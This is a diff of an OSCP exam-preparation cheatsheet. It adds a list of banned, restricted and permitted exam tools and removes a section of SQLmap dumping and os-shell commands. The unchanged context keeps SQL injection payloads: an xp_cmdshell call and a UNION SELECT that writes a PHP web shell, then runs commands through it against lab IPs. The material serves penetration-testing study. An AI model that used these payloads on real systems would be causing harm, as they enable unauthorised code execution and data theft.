@@ -2,10 +2,33 @@
 
 **Prepared as part of my OSCP Preparation.**
 
-- Successfully passed the OSCP exam on May 20, 2024. Verify my achievement [here](https://www.credential.net/666b9a86-017d-48fa-894a-5c39ef1d7b7b).
-- Feel free to open a pull request if you have any corrections, improvements, or new additions!
-- You can access my cheatsheet from here: https://s4thv1k.com/posts/oscp-cheatsheet/ as well!
-- Helped over 20 individuals in passing their exam:) Please let me know if this helped you too ❤️
+- OSCP Checklist inspired by Sai Sathvik, original repository [here](https://github.com/saisathvik1/OSCP-Cheatsheet).
+
+## ⚠️ OSCP Banned / Restricted Tools
+
+> Always verify against the [Official OffSec OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide), as exam rules may change.
+
+### ❌ Prohibited
+- **SQLmap / SQLninja** — automated SQL injection
+- **Nessus / OpenVAS / NeXpose** — automated vulnerability scanners
+- **Burp Suite Professional** — prohibited commercial functionality
+- **AI / LLM tools** — ChatGPT, Claude, Gemini, etc.
+
+### ⚠️ Restricted
+- **Metasploit / Meterpreter** — limited to one exam target
+- **Responder** — tool permitted, but poisoning/spoofing functionality is prohibited
+
+### ✅ Not Banned
+- `msfvenom`
+- Metasploit `multi/handler`
+- Nmap / NSE
+- Burp Suite Community
+- Impacket
+- BloodHound / SharpHound
+- Mimikatz
+- Evil-WinRM
+
+> **Note:** A permitted tool may contain prohibited functionality. You are responsible for ensuring the features you use comply with the current exam rules.
 
 # General
 
@@ -1100,18 +1123,6 @@ EXECUTE xp_cmdshell 'whoami';
 ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
 #Now we can exploit it
 http://192.168.45.285/tmp/webshell.php?cmd=id #Command execution
-```
-
-- SQLMap - Automated Code Execution
-
-```powershell
-sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
-sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping database
-
-#OS Shell
-#  Obtain the Post request from Burp suite and save it to post.txt
-sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp" #/var/www/html/tmp is the writable folder on target, hence we're writing there
-
 ```
 
 ---
